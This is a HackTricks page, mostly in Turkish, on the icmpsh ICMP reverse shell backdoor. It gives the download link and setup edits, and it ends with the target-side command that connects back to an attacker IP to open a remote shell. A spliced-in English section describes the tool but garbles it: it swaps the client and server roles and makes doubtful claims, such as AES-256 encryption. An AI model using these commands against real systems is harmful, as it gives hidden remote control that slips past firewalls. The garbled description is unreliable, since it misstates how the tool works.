<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan kahraman seviyesine yükseltmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **katkıda bulunun**.

</details>


Arka kapıyı şuradan indirin: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# İstemci tarafı

Komut dosyasını çalıştırın: **run.sh**

**Hata alırsanız, aşağıdaki satırları değiştirmeyi deneyin:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
# ICMP Reverse Shell (icmpsh)

ICMP Reverse Shell (icmpsh) is a simple reverse shell that uses the Internet Control Message Protocol (ICMP) to establish a command and control (C2) channel between the attacker and the target machine. This technique allows the attacker to bypass firewalls and other network security measures that may be in place.

## How it works

The icmpsh tool consists of two components: the client-side and the server-side. The client-side is executed on the attacker's machine, while the server-side is executed on the target machine.

1. The client-side sends ICMP echo request packets to the target machine, containing the commands to be executed.
2. The server-side receives the ICMP echo request packets and extracts the commands.
3. The server-side executes the commands and sends the output back to the client-side in ICMP echo reply packets.
4. The client-side receives the ICMP echo reply packets and displays the output to the attacker.

## Usage

To use icmpsh, you need to have root privileges on the attacker's machine and the target machine must have ICMP echo request/reply enabled.

1. Download and compile the icmpsh tool on both the attacker's machine and the target machine.
2. Start the server-side on the target machine: `./icmpsh -s`
3. Start the client-side on the attacker's machine: `./icmpsh -c <target_ip>`
4. Once the connection is established, you can execute commands on the target machine through the client-side.

## Features

- Stealthy: ICMP traffic is often allowed through firewalls and is less likely to be detected.
- Cross-platform: icmpsh is written in C and can be compiled and executed on various operating systems.
- Encrypted communication: icmpsh supports encryption of the command and control channel using AES-256.

## Limitations

- Limited command execution: icmpsh is designed for simple command execution and does not support interactive shell sessions.
- Network limitations: icmpsh may not work in environments where ICMP traffic is heavily filtered or blocked.
- Detection: While icmpsh is stealthy, it can still be detected by advanced network monitoring tools.

## References

- [icmpsh GitHub repository](https://github.com/inquisb/icmpsh)
- [ICMP Reverse Shell with icmpsh](https://www.hackingarticles.in/icmp-reverse-shell-with-icmpsh/)
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Hedef Taraf**

**icmpsh.exe** dosyasını hedefe yükle ve çalıştır:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
